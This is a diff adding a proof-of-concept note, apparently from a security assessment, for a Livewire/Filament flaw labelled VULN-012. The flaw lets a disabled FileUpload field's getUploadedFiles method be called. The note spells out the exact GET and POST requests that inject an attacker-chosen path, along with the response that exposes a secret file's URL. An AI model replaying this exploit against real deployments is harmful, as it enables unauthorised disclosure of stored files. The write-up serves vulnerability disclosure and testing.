@@ -1,0 +1,24 @@
+### VULN-012 — decisive request. Full capture in response.txt / run.log.
+### The generic schema dispatcher filters HIDDEN components but not DISABLED ones, then
+### invokes any #[ExposedLivewireMethod]. So getUploadedFiles() (the VULN-004 oracle) is
+### callable on a field the UI renders ->disabled().
+
+### 1) Snapshot (page contains a FileUpload rendered disabled="disabled")
+GET /forms/fields/file-upload HTTP/1.1
+Host: localhost:21890
+
+### 2) Invoke the exposed read method on the DISABLED field with an attacker path
+POST /livewire/update HTTP/1.1
+Host: localhost:21890
+Content-Type: application/json
+X-Livewire: true
+
+{"_token":"<csrf>","components":[{"snapshot":"<forms.fields-demo snapshot>",
+  "updates":{"data.fileUploadDisabled":{"inj":"disabled-victim-<suffix>/secret-<suffix>.txt"}},
+  "calls":[{"path":"","method":"callSchemaComponentMethod",
+            "params":["form.fileUploadDisabled","getUploadedFiles"]}]}]}
+
+### Response effects.returns:
+### [{"inj":{"name":"secret-<suffix>.txt","size":..,"type":"text/plain",
+###          "url":"http://localhost:21890/storage/disabled-victim-<suffix>/secret-<suffix>.txt"}}]
+### i.e. the oracle fired despite the field being disabled.
